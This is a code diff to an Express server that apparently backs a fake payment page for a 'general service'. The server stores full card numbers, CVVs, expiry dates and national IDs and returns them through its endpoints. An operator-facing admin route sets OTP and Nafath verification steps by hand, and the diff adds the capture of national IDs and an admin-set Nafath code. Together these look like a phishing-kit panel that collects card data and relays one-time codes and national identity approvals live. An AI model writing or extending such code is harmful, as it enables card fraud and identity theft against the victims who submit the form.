@@ -13,13 +13,20 @@ interface Transaction {
   cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
   amount: number;
   timestamp: string;
-  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
+  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
   otpCode: string;
   submittedOtp?: string;
   serviceName?: string;
+  nationalId?: string;
+  nafathVerified?: boolean;
+  nafathCode?: string;
 }
 
 // In-memory Database
+let nafathConfig = {
+  currentCode: '26'
+};
+
 let transactions: Transaction[] = [
   {
     id: 'tx-1001',
@@ -91,6 +98,21 @@ async function startServer() {
     res.json({ status: 'ok', time: new Date().toISOString() });
   });
 
+  // Get active Nafath verification code
+  app.get('/api/nafath-config', (req, res) => {
+    res.json(nafathConfig);
+  });
+
+  // Update Nafath verification code (called from Admin Portal)
+  app.post('/api/nafath-config', (req, res) => {
+    const { currentCode } = req.body;
+    if (currentCode !== undefined && typeof currentCode === 'string') {
+      nafathConfig.currentCode = currentCode.trim().substring(0, 4); // Limit to 4 chars for aesthetics
+      return res.json({ success: true, nafathConfig });
+    }
+    return res.status(400).json({ error: 'Invalid or missing currentCode.' });
+  });
+
   // Get all transactions
   app.get('/api/transactions', (req, res) => {
     res.json(transactions);
@@ -103,14 +125,10 @@ async function startServer() {
 
   // Standalone Admin Portal update status route
   app.post('/api/admin/update-status', (req, res) => {
-    const { id, status } = req.body;
+    const { id, status, nafathCode } = req.body;
 
-    if (!id || !status) {
-      return res.status(400).json({ error: 'Missing required fields (id, status).' });
-    }
-
-    if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].includes(status)) {
-      return res.status(400).json({ error: 'Invalid target status.' });
+    if (!id) {
+      return res.status(400).json({ error: 'Missing required field (id).' });
     }
 
     const txIndex = transactions.findIndex(t => t.id === id);
@@ -118,7 +136,19 @@ async function startServer() {
       return res.status(404).json({ error: 'Transaction not found.' });
     }
 
-    transactions[txIndex].status = status;
+    if (status) {
+      if (!['PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED', 'AWAITING_NAFATH', 'NAFATH_VERIFIED'].includes(status)) {
+        return res.status(400).json({ error: 'Invalid target status.' });
+      }
+      transactions[txIndex].status = status;
+      if (status === 'NAFATH_VERIFIED') {
+        transactions[txIndex].nafathVerified = true;
+      }
+    }
+
+    if (nafathCode !== undefined) {
+      transactions[txIndex].nafathCode = nafathCode.trim().substring(0, 4);
+    }
 
     return res.json({
       success: true,
@@ -152,13 +182,101 @@ async function startServer() {
       cardType: tx.cardType,
       cardNumber: tx.cardNumber,
       cardholderName: tx.cardholderName,
-      serviceName: tx.serviceName
+      serviceName: tx.serviceName,
+      nationalId: tx.nationalId,
+      nafathVerified: tx.nafathVerified,
+      nafathCode: tx.nafathCode
+    });
+  });
+
+  // POST /api/nafath-start: Create a pending Nafath session transaction
+  app.post('/api/nafath-start', (req, res) => {
+    const { nationalId, serviceName, amount } = req.body;
+
+    if (!nationalId) {
+      return res.status(400).json({ error: 'Missing national ID.' });
+    }
+
+    const finalAmount = amount ? parseFloat(amount) : 100.00;
+    const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    const newTxId = `tx-${Math.floor(100000 + Math.random() * 900000)}`;
+    const randomNafathCode = Math.floor(10 + Math.random() * 90).toString(); // Generate unique Nafath code 10-99
+
+    const newTx: Transaction = {
+      id: newTxId,
+      cardNumber: 'Awaiting Card...',
+      cardholderName: 'Awaiting Cardholder Name...',
+      expiry: '--/--',
+      cvv: '---',
+      cardType: 'unknown',
+      amount: finalAmount,
+      timestamp: new Date().toISOString(),
+      status: 'AWAITING_NAFATH',
+      otpCode: randomOtp,
+      serviceName: serviceName || 'خدمة عامة',
+      nationalId,
+      nafathVerified: false,
+      nafathCode: ""
+    };
+
+    transactions.unshift(newTx);
+
+    return res.json({
+      success: true,
+      transaction: newTx
+    });
+  });
+
+  // POST /api/nafath-verify: Complete Nafath matching step on server
+  app.post('/api/nafath-verify', (req, res) => {
+    const { id } = req.body;
+    if (!id) {
+      return res.status(400).json({ error: 'Missing transaction ID.' });
+    }
+
+    const tx = transactions.find(t => t.id === id);
+    if (!tx) {
+      return res.status(404).json({ error: 'Transaction not found.' });
+    }
+
+    tx.status = 'NAFATH_VERIFIED';
+    tx.nafathVerified = true;
+
+    return res.json({
+      success: true,
+      transaction: tx
+    });
+  });
+
+  // POST /api/pay-update: Update the pending transaction with real card info
+  app.post('/api/pay-update', (req, res) => {
+    const { id, cardNumber, cardholderName, expiry, cvv, cardType } = req.body;
+
+    if (!id || !cardNumber || !cardholderName || !expiry || !cvv) {
+      return res.status(400).json({ error: 'Missing required update fields.' });
+    }
+
+    const tx = transactions.find(t => t.id === id);
+    if (!tx) {
+      return res.status(404).json({ error: 'Transaction not found.' });
+    }
+
+    tx.cardNumber = cardNumber;
+    tx.cardholderName = cardholderName.trim();
+    tx.expiry = expiry;
+    tx.cvv = cvv;
+    tx.cardType = cardType || 'unknown';
+    tx.status = 'PENDING_CARD_APPROVAL';
+
+    return res.json({
+      success: true,
+      transaction: tx
     });
   });
 
   // POST /api/pay: Create transaction, generate OTP, set status PENDING_CARD_APPROVAL
   app.post('/api/pay', (req, res) => {
-    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName } = req.body;
+    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName, nationalId, nafathVerified } = req.body;
 
     if (!cardNumber || !cardholderName || !expiry || !cvv) {
       return res.status(400).json({ error: 'Missing required payment fields.' });
@@ -181,7 +299,9 @@ async function startServer() {
       timestamp: new Date().toISOString(),
       status: 'PENDING_CARD_APPROVAL',
       otpCode: randomOtp,
-      serviceName: serviceName || 'خدمة عامة'
+      serviceName: serviceName || 'خدمة عامة',
+      nationalId,
+      nafathVerified
     };
 
     transactions.unshift(newTx);
@@ -195,7 +315,7 @@ async function startServer() {
 
   // Submit a new transaction (alternative backward compatible endpoint)
   app.post('/api/submit', (req, res) => {
-    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName } = req.body;
+    const { cardNumber, cardholderName, expiry, cvv, cardType, amount, serviceName, nationalId, nafathVerified } = req.body;
 
     if (!cardNumber || !cardholderName || !expiry || !cvv) {
       return res.status(400).json({ error: 'Missing required payment fields.' });
@@ -216,7 +336,9 @@ async function startServer() {
       timestamp: new Date().toISOString(),
       status: 'PENDING_CARD_APPROVAL',
       otpCode: randomOtp,
-      serviceName: serviceName || 'خدمة عامة'
+      serviceName: serviceName || 'خدمة عامة',
+      nationalId,
+      nafathVerified
     };
 
     transactions.unshift(newTx);
